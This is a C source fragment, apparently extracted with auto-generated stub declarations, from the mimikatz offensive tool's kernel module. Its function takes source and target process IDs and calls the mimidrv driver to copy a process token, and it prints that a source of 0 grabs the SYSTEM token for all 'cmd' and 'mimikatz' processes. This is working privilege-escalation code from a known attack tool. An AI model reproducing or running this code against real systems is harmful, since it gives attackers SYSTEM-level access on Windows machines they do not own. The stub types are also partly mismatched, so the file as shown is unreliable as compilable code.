
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;




typedef struct TYPE_3__ TYPE_1__ ;


typedef int wchar_t ;
struct TYPE_3__ {void* toProcessId; void* fromProcessId; int member_1; int member_0; } ;
typedef int PCWCHAR ;
typedef int NTSTATUS ;
typedef TYPE_1__ MIMIDRV_PROCESS_TOKEN_FROM_TO ;


 int IOCTL_MIMIDRV_PROCESS_TOKEN ;
 int STATUS_SUCCESS ;
 int kprintf (char*,...) ;
 int kull_m_kernel_mimidrv_simple_output (int ,TYPE_1__*,int) ;
 scalar_t__ kull_m_string_args_byName (int,int **,char*,int *,int *) ;
 void* wcstoul (int ,int *,int ) ;

NTSTATUS kuhl_m_kernel_processToken(int argc, wchar_t * argv[])
{
 MIMIDRV_PROCESS_TOKEN_FROM_TO tokenInfo = {0, 0};
 PCWCHAR szFrom, szTo;

 if(kull_m_string_args_byName(argc, argv, L"from", &szFrom, ((void*)0)))
  tokenInfo.fromProcessId = wcstoul(szFrom, ((void*)0), 0);

 if(kull_m_string_args_byName(argc, argv, L"to", &szTo, ((void*)0)))
  tokenInfo.toProcessId = wcstoul(szTo, ((void*)0), 0);

 kprintf(L"Token from process %u to process %u\n", tokenInfo.fromProcessId, tokenInfo.toProcessId);
 if(!tokenInfo.fromProcessId)
  kprintf(L" * from 0 will take SYSTEM token\n");
 if(!tokenInfo.toProcessId)
  kprintf(L" * to 0 will take all \'cmd\' and \'mimikatz\' process\n");

 kull_m_kernel_mimidrv_simple_output(IOCTL_MIMIDRV_PROCESS_TOKEN, &tokenInfo, sizeof(MIMIDRV_PROCESS_TOKEN_FROM_TO));

 return STATUS_SUCCESS;
}
